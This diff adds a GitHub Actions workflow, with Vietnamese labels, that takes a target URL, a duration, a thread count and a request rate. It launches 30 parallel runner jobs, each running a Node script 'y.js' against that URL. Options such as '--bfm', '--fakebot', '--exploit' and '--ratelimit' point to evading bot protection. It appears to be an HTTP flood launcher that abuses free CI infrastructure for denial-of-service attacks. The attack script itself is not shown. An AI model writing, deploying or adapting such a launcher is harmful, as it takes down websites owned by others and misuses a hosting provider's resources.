@@ -1,0 +1,57 @@
+name: YJS 30x MAX | FULL POWER
+run-name: YJS 30x | ${{ inputs.url }} | T${{ inputs.time }} | Th${{ inputs.thread }} | R${{ inputs.rate }}
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        description: 'URL mục tiêu'
+        required: true
+        default: 'https://example.com'
+      time:
+        description: 'Thời gian chạy mỗi phiên (giây)'
+        required: true
+        default: '120'
+      thread:
+        description: 'Số luồng mỗi job'
+        required: true
+        default: '10'
+      rate:
+        description: 'Yêu cầu/giây mỗi luồng'
+        required: true
+        default: '50'
+      options:
+        description: 'Tùy chọn thêm (để trống hoặc gõ: --status --bfm --query --randpath --exploit --fakebot --ratelimit)'
+        required: false
+        default: ''
+
+concurrency:
+  group: yjs-30x-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  run-30x:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Cài Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+          # BỎ cache: 'npm' vì không có package.json
+
+      - name: Tạo package.json tạm & cài thư viện
+        run: |
+          npm init -y
+          npm i uuid colors
+
+      - name: CHẠY TỐI ĐA - Phiên ${{ matrix.instance }}
+        run: node y.js ${{ inputs.url }} ${{ inputs.time }} ${{ inputs.thread }} ${{ inputs.rate }} ${{ inputs.options }}
+
